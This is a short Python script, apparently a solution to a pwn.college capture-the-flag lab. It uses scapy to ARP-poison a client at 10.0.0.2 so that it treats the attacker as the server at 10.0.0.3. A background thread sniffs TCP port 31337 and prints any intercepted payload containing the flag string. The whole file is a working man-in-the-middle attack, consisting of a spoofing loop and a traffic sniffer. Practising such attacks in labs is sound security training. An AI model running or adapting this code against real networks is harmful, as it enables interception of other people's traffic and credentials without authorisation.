# intercept_flag.py

from scapy.all import *
import threading
import time

# Target and spoof details
victim_ip = "10.0.0.2"    # Client
spoof_ip = "10.0.0.3"     # Server (spoofed)
iface = "eth0"

def sniff_packets():
    def process(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            data = pkt[Raw].load
            print("[*] Got data:", data)
            if b"pwn.college" in data.lower():
                print("[*] FLAG:", data.decode(errors="ignore"))
    
    print("[*] Starting sniffer...")
    sniff(filter="tcp port 31337", prn=process, iface=iface, store=0)

def arp_poison():
    print("[*] Starting ARP spoofing...")
    while True:
        pkt = ARP(op=2, pdst=victim_ip, psrc=spoof_ip)
        send(pkt, verbose=False, iface=iface)
        time.sleep(0.1)

# Start sniffer thread first
sniffer_thread = threading.Thread(target=sniff_packets)
sniffer_thread.daemon = True
sniffer_thread.start()

# Start poisoning (main thread)
arp_poison()

